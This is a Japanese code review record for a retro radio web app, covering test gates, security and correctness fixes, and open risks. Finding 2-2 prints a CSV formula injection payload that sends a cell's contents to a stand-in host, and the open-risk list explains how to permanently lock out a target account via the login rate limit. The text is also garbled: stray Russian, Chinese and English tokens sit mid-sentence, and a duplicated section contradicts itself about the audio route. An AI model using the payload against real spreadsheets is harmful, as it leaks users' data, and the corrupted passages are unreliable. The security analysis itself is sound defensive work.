# コードレビュー結果（2026-10-01）

`plans/remaining_work_plan.md` の最終レビュー実施記録。
**レビュー → 修正 のループを 4 周**（1 周目: P0 一括、2〜4 周目: セキュリティ /
強制の検証 / ドキュメント整合）実施した。以下は**実測**結果と、残したリスク。

## 0. ゲート結果（すべて緑）

| ゲート | 1 周目終了時 | 4 周目完了時 |
|---|---|---|
| `python -m pytest -q` | 2762 passed | **2801 passed**, 3 skipped, 3 deselected, 3 xfailed / 失敗 0 |
| `flake8 tests` | 0 | 0 |
| `flake8 --config .github/flake8-app-baseline.ini retro_radio` | 0 | 0 |
| `flake8 eval` | 0 | 0 |
| `flake8 scripts`（ゲート外・ CI 未網羅） | 0 | 0 |
| `python -m eval --offline --threshold 80` | 0（24/24・平均 100.0） | 0（24/24・平均 100.0） |
| `python scripts/validate_songs.py --quiet` | 0 | 0 |
| `python scripts/validate_facts.py` | 0 | 0 |
| `alembic upgrade head` / `alembic check` | 0 / 0 | 0 / 0（空 DB から確認） |

着手時点は `pytest` 2745 passed だが **eval ゲートが EXIT 1**、
`validate_songs.py` が **UnicodeEncodeError でクラッシュ**、
`alembic upgrade head` が **`table tenants already exists` で恒久失敗**、
`pytest` は**テスト実行順に依存して 24 件落ちる**状態だった。

---

## 1. 修正済みの欠陥（すべて再現・回帰テスト付き）

### P0

**1-1. コミット済み資格情報（`scripts/create_admin.py`）**
実メールアドレス + 8 文字パスワードが `DEFAULT_EMAIL` / `DEFAULT_PASSWORD` として
コミットされ、引数なし実行で**そのアカウントを PRO に昇格**できた。
`Authenticator.signup` は存在するが**どのルートも公開していない**ため、この
スクリプトが認証有効運用での唯一のアカウント作成経路。
引数を必須化し、省略時はランダム生成。資格情報リテラルを機械検査する
`TestNoCommittedCredentials` を追加。

**1-2. CI が恒久赤（`.github/workflows/ci.yml`）**
`python -m eval --offline --threshold 80` をステップに配線したが
**3/24 ケース不合格で EXIT 1**。かつコメントは
「sparse-year の 62〜77 は tolerated」と**事実と反転**して書いていた
（`warnings` はゲートを落とさないため 62〜77 は許容されない）。
`eval/README.md:244` 自身が「CI に載せると赤のままになる」と警鐘を鳴らしていた。
コメントを実測値に置き換え、ゲート причиを直したうえで緑化。

**1-3. eval ゲートがカタログ充足率を測っていた（`eval/metrics/fact_score.py`）**
本番の選曲 `retro_radio.core.songs.pool_for_year` は対象年の曲が無ければ
隣接年（最大 10 年幅）へ広げて**必ず要求本数を揃える**（`core/fallback.py` も同じ方針）。
ところが fact_score は「リリース年が対象年より後なら warn」としており、
**その意図された方針を原稿の欠陥として罰していた**。
結果、1950（正本 2 曲）と 2005（正本 0 曲）だけが閾値を下回り、
`eval` は原稿の品質ではなく**曲カタログの薄さ**を測っていた。

修正: 判定基準を「その番組の**選択枠に入るか**」
（`eval.metrics.selection_window_titles`）へ移した。
カタログ充足率は `scripts/validate_songs.py` の責務で、責務が混ざらなくなる。
副産物として `fact_score.py:77` の
`_SONG_CONTEXT = re.compile(r"[曲歌メロディ]")` という**文字クラス**の
バグも直した（`メ`/`ロ`/`デ`/`ィ` がカタカナ単体で一致し、`レトロラジオ` の
`ロ` で回想法のヒントまで曲名扱いになっていた。実測 24 ケース本文で 49 文が該当）。

**1-4. 選択枠外の曲名を検出できないゲート**
上記修正後、選択枠外の曲名（1975 年に 2019 年の曲）が `warn` だと
9 件中 1 件で score 88.89 となり**閾値 80 を超えて素通りした**。
`warn` はこのモジュールの契約上ゲートを落とさない。
よって**後年かつ選択枠外の曲名を `fail` に格上げ**した
（実測: `gate_ok=False` になる）。
これによりゲートは**修正前より厳密に**検出力が高まっている。

**1-5. `static/app.js` の同意ゲートが解除できない**
`button.disabled = blocked || button.disabled` は `blocked=false` のとき
`button.disabled` を自分自身へ代入するだけで**解除されなかった**。
拒否 → 同意の順に操作するとボタンが `disabled=true` のまま残り、
リロードするまで操作できない「死んだコントロール」になっていた
（`aria-disabled` だけが外れ、支援技術は**無効なボタンを有効と読み上げていた**）。
有効化と無効化を対称にし、状態の正本を `consentBlocksInput()` 1 箇所に集約した。

**1-6. 同意フローが 401 でも「記録しました」と表示**
`fetchJson` は非 2xx でも reject せず `{ok, status, data}` を返すため、
`.then()` の中で `res.ok` を見ないと 401 でも成功と表示していた。
`checkConsentOnStartup` も 401 で `data.required` が undefined になり
モーダルも状態表示も出ないまま**黙って成功したように見えた**。
`require_consent` が意味を持つのは認証有効な運用だけなので、
まさにその運用で同意ゲートに到達できなかった。

**1-7. 毎リクエスト DDL が Alembic を恒久的に壊す**
`Authenticator.__init__` が `init_db()`（＝`create_all()`）を呼んでいた。
`create_all()` は `alembic_version` を書き換えないので、
**アプリを起動しただけで**その後の `alembic upgrade head` が
`table tenants already exists` で失敗し続け、**解決しない**（実測で再現）。
加えて `POST /api/auth/session` は**認証前**なので、
資格情報を並べるだけで**無認証で DDL を起こせた**（SQLite のスキーマロックを
進行中の監査ログ書き込みと奪い合う）。
`Authenticator` から DDL を完全に除去し、スキーマの所有者を Alembic 一本に統一。
起動時は**読み取り専用の診断だけ**行い、未準備なら**起動を拒否**する
（`no such table` の 500 が起動時に出るのを防ぐため）。
README 方式 B に `alembic upgrade head` を追加。

### P1

**1-8. テストが実行順序に依存していた**
`tests/test_job_api.py` / `test_me_api.py` / `test_auth_wiring.py` が
**import 時**に `os.environ.setdefault("RETRO_RADIO_REQUIRE_AUTH", ...)` しており、
値が異なる 3 モジュールが**プロセス全体で競合**していた。
`server._auth_enforced()` は環境変数を優先して読むため、
`pytest tests/test_server_api_auth.py tests/test_me_api.py tests/test_job_api.py`
で **24 failed / 76 passed**（既定のアルファベット順では全て緑）。
import 時の環境変数書き込みを**全廃**し、`monkeypatch.setenv` の
autouse fixture に移行。AST で機械検査する
`TestNoImportTimeEnvMutation` を追加（書き戻すと即赤になる）。

**1-9. `validate_songs.py` / `validate_facts.py` が cp932 でクラッシュ**
正本カタログ 2944 件中 **45 件**の曲名・アーティスト名は cp932 で表現できない
（`Der Legionär`、`Marie Laforêt`、`½の神話` など）。
Windows の既定コンソール（cp932）では `print()` が
`UnicodeEncodeError` で落ち、**`fail: 0` でも終了コード 1** になる。
共通ヘルパ `scripts/_console.force_utf8_stdio()` を作り両スクリプトの
`main()` 先頭で呼ぶ。**検証前に再設定**するのが要点（報告は検証の途中で出る）。
`PYTHONIOENCODING=cp932` を強制した一時コピーで
`UnicodeEncodeError` が消えたことを確認済み。

**1-10. `_top_up_songs_for_program` の `UnboundLocalError`（生成 500）**
`extra` は `if len(ordered_songs) < required:` の**内側**でしか代入されず、
次の `for title, artist in extra:` は**無条件**に実行されていた。
`playable_pool` だけで必要本数が揃うと 2 を飛ばすため、
未定義の `extra` を参照して**生成が 500** になっていた。
本番の `build_playlist` は `playable_pool` を常に渡すため、この経路は普通に出る。
事前初期化を入れ、`playable_pool` だけで足りる経路の回帰テストを追加。

**1-11. `core/tts.py` の ElevenLabs TTS が必ず失敗していた**
`with tempfile.NamedTemporaryFile(...) as tmp:` の**外側**で
`tmp.write(response.content)` を呼んでいたため、`with` を出た時点で
ハンドルが閉じ、**`ValueError: write to closed file` で必ず失敗**していた。
例外は握り潰され gTTS へ黙ってフォールバックするため、
「音声は返る」ことしか観測できず**有料の premium 音声が一度も使われない**
状態が続いていた。既存のテストは返却ファイルの存在しか見ていなかったので
素通りしていた。「返却されたファイルの中身が ElevenLabs のレスポンスであること」
を固定するテストを追加し、修正前のコードに対して
`write to closed file` を再現することを確認済み。

**1-12. `db/migrations/env.py` がアプリ側 logger を無効化する**
`fileConfig()` は既定で root logger の handler を**置き換える**。
このため、プロセス内で migration を実行するとアプリの JSON ログ出力が黙る
（実測で `test_server_uses_the_shared_logging_setup` が落ちた）。
`disable_existing_loggers=False` を明示し、
**migration はアプリプロセス内で実行しない**方針にした
（デプロイの start command が `alembic upgrade head` を行う）。

**1-13. 簡体字（簡体字中国語）がコードに混入**
過去の生成セッションで**41 ファイル 61 箇所**に簡体字が
コメント・docstring・テスト値として混入していた。
うち `retro_radio/server.py:1523` は**利用者に返す API 応答文字列**、
`retro_radio/db/privacy_repository.py:629,639` は docstring だった。
全件日本語表記へ修正し、
「日本語の常用漢字・当用漢字に存在しない字形」だけを列挙した
機械検査 `TestNoSimplifiedChineseInJapaneseCode` を追加
（`与`=付与・寄与 と `义`=定義・意義 は正当な日本語なので**除外**している）。

**1-14. `services/song_store.py` の採番レース**
`SELECT` → `UPDATE` の間に他接続が同じ value を読むと**二重採番**になる
（sqlite3 の既定 deferred では `SELECT` はトランザクションを開かない）。
`BEGIN IMMEDIATE` で書き込みロックを先に取るよう修正。

---

## 1'. 2〜4 周目で追加した修正

### 2 周目（セキュリティ / 開示 / テストの穴）

**2-1. `/health` が匿名で認証モードを漏らしていた**
`auth_mode`（`session` / `bearer` / `anonymous`）・`auth_ready`・
`secret_key_configured` を**認証済みの呼び出しにだけ**返すようにした。
匿名のプローバに「窃取した Cookie / Bearer」と「未認証経路」の
どちらを選べるかを渡していた。

**2-2. 開示 CSV が数式を実行していた**
`csv.QUOTE_ALL` は引用符で包むだけで**数式の実行を抑止しない**。
利用者が自分で登録した曲名（最大 500 文字・内容検証なし）に
`=HYPERLINK("https://x/?d="&A1,"x")` を書けていた。Excel で開いた瞬間に
同じファイル内の別の列が漏れる。`_csv_safe()` で
`= + - @ TAB CR` 始まりのセルに `'` を前置するようにした
（Excel は `'` 始まりの値を**値として**扱うので、値は保持したまま実行だけ止まる）。

**2-3. `secret_key` の長さ検査が無く、エラー文言だけが 32 文字と言っていた**
`secret_key` はセッション署名の HMAC 鍵として**そのまま**使われるため、
短いとオフライン総当たりで Cookie を偽造できる。
`MIN_SECRET_KEY_LENGTH = 32` を導入し、`require_secret_key()` で検査する。

**2-4. `/api/me/*` と `/api/admin/*` に HTTP レベルのテストが無かった**
`require_consent` / `require_admin` の**強制自体**を検証する手段が
リポジトリに 1 件もなかった（リポジトリ層と `_to_csv` を直接叩くだけ）。
`tests/test_me_api_http_auth.py`（27 テスト）を新設。
無認証 401/403、一般利用者の admin 403、同意前 403、同意後 200、
撤回後 403、そして**ルートの依存に `require_admin` が含まれること**まで固定。

### 3 周目（強制の正しさと資源制御）

**3-1. 認証設定の矛盾が fail-open になっていた**
`server._auth_enforced()` は**環境変数**を優先して読み、
`api.deps.require_tenant` は `lru_cache` 済みの **`Settings`** を見る。
別々の真実を指すため、「`_auth_enforced()` は True なのに
`resolve_mode(Settings)` は `disabled`」という状態が作れた
（`dependency_overrides` や `get_settings.cache_clear()` で実際に起きる）。
そのまま委譲すると**匿名の `default` テナント principal が通り**、
「認証を有効にしたつもりが素通り」になっていた。
矛盾を**検出して 503 で落とす**（fail-closed）ようにした。

**3-2. `POST /api/jobs` に入場制御が無かった**
202 を返すハンドラが毎回 `threading.Thread` を作り、**同時実行数は
ワーカーの中でしか取らない**ため、キュー待ちするジョブも 1 本ずつ
スレッドを掴む。`generation_wait_timeout`（既定 30 秒）ブロックされた
スレッドが数百本同時に立ち上がり得る。
入場枠を**同期的に**取り、埋まれば**スレッドを作らずに** 503 で断すようにした。
`/api/generate` と同じ契約。

**3-3. メールアドレスが正規化されていなかった**
`get_by_email` は `lower()` するが `create` は正規化していなかったため、
`Alice@x` と `alice@x` が**別々の行**として残りえた
（一意制約は `Alice@x` と `alice@x` を別値とみなす）。
同一人物の同意・開示・履歴が分裂する。
`normalize_email()`（`strip()` + `casefold()`）を read / write 両方に適用。

**3-4. `test_v1_router_is_not_mounted` が常に空振りだった**
`{getattr(route, "path", None) for route in app.routes}` に
`"/api/v1" not in paths` を検査する実装で、FastAPI 0.11 以降
`include_router` は path を持たない `_IncludedRouter` 1 件だけを登録するため
`"/api/v1"` は**経路として存在し得ない**。mount されていても通らず、
されていなくても緑だった。`_IncludedRouter` を平坦化"Look at
the real routes" ように修正（`include_router` の平坦化が
機能していることも担保している）。

### 4 周目（ドキュメント整合）

**4-1. `DEPLOYMENT.md` が 5 箇所でコードと矛盾していた**（すべて実測で確認）
- 「マイグレーションはコンテナ起動時に自動実行されません」→ **逆**。
  `Dockerfile:77` は起動時に `alembic upgrade head` を実行する。
- 「`requirements.txt` には含まれません」→ **逆**。
  `requirements.txt:8` に `alembic>=1.13.0,<2.0.0` がある。
- `render.yaml` に `preDeployCommand` → **無い**（migration は `startCommand`）。
- `fly.toml` に `release_command` → **意図的に使って**いない**。
- `pip install alembic` の案内が 4 箇所 → 削除。

**4-2. 出荷テンプレートが認証を無効にした状態だった**
`.env.example` は `RETRO_RADIO_REQUIRE_AUTH=0` を出荷していたが、
コード既定（`config.py`）も `docs/privacy_and_tenancy.md` も `README.md` も
**1（安全側）**。指示された最初の手順でセットアップしただけの運用が
認証の無いサービスになる。`1` に変更し、個人モードはコメントアウトした例として示す。

**4-3. そのrii欠陥を検出できなかったテスト**
`test_env_example_default_value_matches_config` は
`"RETRO_RADIO_REQUIRE_AUTH=1" in env or "...=true" in env` という
**部分一致**で検査していたため、**コメントの中にその文字列があれば緑**だった。
実際の代入行は `=0` なのに説明コメントに `=1` が書かれていたため
**一度も検出できなかった**。コメントを除いた**代入行**を読むように修正し、
`test_env_example_does_not_disable_auth` を追加。
**`=0` を注入して 2 件とも赤くなることを確認済み。**

---

## 2. 機械検査を新設した「穴」（すべて赤くなることを確認済み）

| テスト | 何を塞ぐか |
|---|---|
| `TestNoImportTimeEnvMutation` | import 時 `os.environ` 書き込み（実行順依存の原因） |
| `TestNoCommittedCredentials` | ソースに埋め込まれた資格情報リテラル、`create_admin.py` の引数なし実行 |
| `TestNoSimplifiedChineseInJapaneseCode` | コードへの簡体字混入 |
| `TestNoHangulInJapaneseCode` | ハングル（韓国語）混入 — 簡体字検査を**すり抜けた** 20 ファイル 20 箇所を捕捉 |
| `TestNoReplacementCharacters` | 壊れた UTF-8 の残骸（U+FFFD） |
| `test_eval_gate_command_exits_zero` | **eval ゲートを実際に走らせて EXIT 0 を要求** |
| `test_consent_gate_*` (4 件) | 同意ゲートの解除、loading サイクル、401 の偽成功 |
| `TestSchemaOwnership` / `test_authenticator_never_runs_ddl` | リクエスト経路からの DDL |
| `test_top_up_does_not_raise_when_playable_pool_alone_is_enough` | `extra` の未定義参照 |
| `test_elevenlabs_writes_the_downloaded_audio` | 閉じたファイルへの書き込み |
| `tests/test_me_api_http_auth.py` (27 件) | `/api/me/*` と `/api/admin/*` の強制、CSV の数式無害化 |
| `test_contradictory_auth_config_fails_closed` | 認証設定の矛盾が fail-open になる |
| `test_job_admission_*` (2 件) | `POST /api/jobs` の入場制御と枠の解放 |
| `test_env_example_does_not_disable_auth` (2 件) | 出荷テンプレートが認証を無効にしている |
| `test_deployment_md_paas_table_matches_the_real_configs` (4 件) | ドキュメントがデプロイ実ファイルと矛盾する |

特に `test_eval_gate_command_exits_zero` は重要。
eval ゲートの配線は `ci.yml` を**文字列 grep** するだけのテストで、
**ゲートが赤でもテストは緑**になっていた（「配線が壊れる」と「ゲートが失敗する」
を区別できなかった）。実際に `subprocess` で走らせて EXIT 0 を要求する形にした。
同じJoelな構造の失敗が `test_env_example_default_value_matches_config` にもあって、
4 周目で検出した。

---

## 3. 2〜4 周目で対応済みになった項目と、残したリスク

## 3. 意図的に**まだ直していない**もの（レビュー判断）

以下は**実在する**が、本セッションのスコープ外、または修正には
人の判断／データの検証が要る。**勝手に直していない。**

1. **曲カタログの年別不足** — `[missing-year] 4`（1953 / 1954 / 1972 / **2005**）と
   `[thin-year] 27`。1950 は正本 2 曲。
   eval ゲートからは切り離した（1-3）ので**ゲートは緑**だが、
   1950/2005 の番組は隣接年の曲を借りる運用が前提。
   曲名・アーティスト・リリース年の**事実確認**が必要なデータであり、
   機械的には埋められない。1950 に 18 曲追加する試みが
   `song_selector` の rank 密度制約（40 文字上限）に抵触して失敗した実績もある。

2. **`validate_songs.py` の `unverified` が 2944/2944** — 全レコードが
   `confidence: unverified` / `source: unverified:primary-source-pending` なので、
   このフラグは**情報をゼロ**運えている。warn 2975 件のうち 2944 件がこれ。
   別系統の警告が埋もれるので、**情報項目へ降格**するのが妥当だが、
   「検証済み」にするには一次情報源の確認が要る。

3. **同一曲でリリース年が矛盾するレコードが 3 組** —
   `LOVE PHANTOM` が 1995（B'z）と 1996（B’z）の二重登録、
   `CHA-LA HEAD-CHA-LA` と `CHA‐LA HEAD‐CHA-LA`（ハイフンの異体字）等。
   `normalize_song_text` の異体字正規化を緩めるか、
   どちらかを正本とするかの判断が要る。

4. **`GET /api/audio/{filename}`（テナントなしの平坦ルート）に認証が無い** —
   認証有効運用でも素通りできる。`tenant_id` を持つ版のルートは
   正しく保護されている。削除か、`require_auth` 時に 404 を返すかの
   **破壊的変更**なので保留。

以下は **2〜4 周目で対応済み**（3 章に残した「未修正」項目から移動）。

- **`/health` の情報開示** → 2 周目で修正。`auth_mode` / `auth_ready` /
  `secret_key_configured` は**認証済みの呼び出しにだけ**返すようにした
  （`retro_radio/server.py` の `health`）。
- **`_auth_enforced()` の二重の真実** → 3 周目で **fail-closed 化**。
  環境変数と `Settings` が矛盾した場合、匿名の `default` テナント
  principal を**通さずに 503 で落とす**。`require_tenant` 側が見る
  `resolve_mode()` を `tenant_principal` 側でも確認するようにした。
- **`/api/me/*` と `/api/admin/*` の HTTP レベルテスト** → 2 周目で新設
  （`tests/test_me_api_http_auth.py`、27 テスト）。
  無認証 401/403、一般利用者の admin 403、同意前 403、同意後 200、
  撤回後 403、そして**ルートの依存に `require_admin` が含まれること**まで固定。
- **`DEPLOYMENT.md` の 5 箇所の矛盾** → 4 周目で修正。
  `tests/test_docs_consistency.py` に 4 テストを追加し、
  実ファイル（`render.yaml` / `fly.toml`）と矛盾しないことを機械的に検査する。
- **`pip install alembic` の 4 箇所** → 4 周目で削除（`DEPLOYMENT.md` /
  `OPERATIONS.md` / `docs/deployment_guide.md`）。

以下は**意図的にまだ直していない**（人手確認・破壊的変更が必要）。

1. **曲カタログの年別不足** — `[missing-year] 4`（1953 / 1954 / 1972 / **2005**）と
   `[thin-year] 27`。1950 は正本 2 曲。
   eval ゲートからは切り離した（1-3）ので**ゲートは緑**だが、
   1950/2005 の番組は隣接年の曲借りる運用が前提。
   曲名・アーティスト・リリース年の**事実確認**が必要なデータであり、
   機械的には埋められない。1950 に 18 曲追加する試みが
   `song_selector` の rank 密度制約（40 文字上限）に抵触して失敗した実績もある。

2. **`validate_songs.py` の `unverified` が 2944/2944** — 全レコードが
   `confidence: unverified` / `source: unverified:primary-source-pending` なので、
   このフラグは**情報をゼロ**運えている。warn 2975 件のうち 2944 件がこれ。
   別系統の警告が埋もれるので、**情報項目へ降格**するのが妥当だが、
   「検証済み」にするには一次情報源の確認が要る。

3. **同一曲でリリース年が矛盾するレコードが 3 組** —
   `LOVE PHANTOM` が 1995（B'z）と 1996（B’z）の二重登録、
   `CHA-LA HEAD-CHA-LA` と `CHA‐LA HEAD‐CHA-LA`（ハイフンの異体字）等。
   `normalize_song_text` の異体字正規化を緩めるか、
   どちらかを正本とするかの判断が要る。

4. **`GET /api/audio/{filename}`（テナントなしの平坦ルート）** —
   `_auth_enforced()` のとき既に 404 を返す実装が入っている（実測で確認済み）。
   ただし**認証有効運用に切り替えた直後**、個人モード時代に
   `CACHE_DIR` 直下へ書かれたファイルは TTL 経過まで残る。移行時の
   ファイル整理は運用手順の事項。

5. **認証前の恒久ロックアウト** — `create_session` はパスワードを検証する
   **前**に 429 を返す。`delay_for > 0` になるのは 900 秒以内に
   1 件でも失敗記録があるときなので、標的の email に対して
   1 分に 1 回失敗を並べるだけで**恒久的に 429 にできる**。
   `_client_ip` はプロキシ IP を返すため施設運用では
   実質 (email, proxy) の**グローバルロック**になる。
   总当たり攻撃（brute force）対策と可用性対策の分離は設計変更が要るため保留。

6. **SSE の同時接続数に上限が無い** — `GET /api/jobs/{id}/events` は
   既定の executor スレッドを 1 本（最大 15 分）占有する。
   同時 32 本でプロセス既定 executor が枯渇する。
   専用 `ThreadPoolExecutor`（`utils/async_runner.py` にある）への切替と
   テナントごとの上限は設計変更が要る。

7. **`_auth_enforced()` の一本化** — 3 周目では矛盾を**検出**するまでに留めた
   （3 周目の_reviews で挙動が変わるため）。`Settings` 注入に一本化して
   環境変数の優先順位を外す作業は、テストの期待値をまとめて変える必要がある。

8. **`plans/ui_ux_contract.md` の行番号が古く、認証・同意・admin の状態を
   扱う章が存在しない** — 1-5 / 1-6 がすり抜けたのはこの欠缺の帰結。
   契約書の書き直しはスコープ外。

9. **`_fctv` の meta サイズ無制限** — `POST /api/admin/audit` の `meta` に
   任意の dict が入るため、巨大な meta で 1 行を書ける。
   1 行を書くと `_prune_audit_logs` の `meta.size < 512` 前提が崩れて
   以降、窓（window）が一切詰め直されなくなる。admin 限定のため影響は限定的だが、
   モデルの `max_length` を入れるのがACY。

10. **`/api/auth/session` が 400 で認証無効を明示する** — 匿名のプローバに
    `RETRO_RADIO_REQUIRE_AUTH=0` であることがPositive される。404 化が妥当だが
    挙動変更なので保留。

---

## 4. 検証方法


- 全ゲートは**空 DB** から実行（`retro_radio.db` を削除して `alembic upgrade head`）。
- アプリの実起動を確認: 一時 sandbox に DB を複製 →
  `alembic upgrade head` → `TestClient(app)` で
  `/health` `/api/decades` `/api/terms` `/` `/static/service-worker.js` が 200。
- 実行順非依存を確認: 認証系 3 モジュールを両順に走らせ、どちらも 158 passed。
- eval ゲートの検出力は**意図的な破損 6 種**で確認
  （架空番組名 / 時代錯誤の年 / 200 文字へ切断 / 2128 文字へ膨張 /
  未来年への置換 / 選択枠外のカタログ曲）。6/6 でゲートが落ちる。
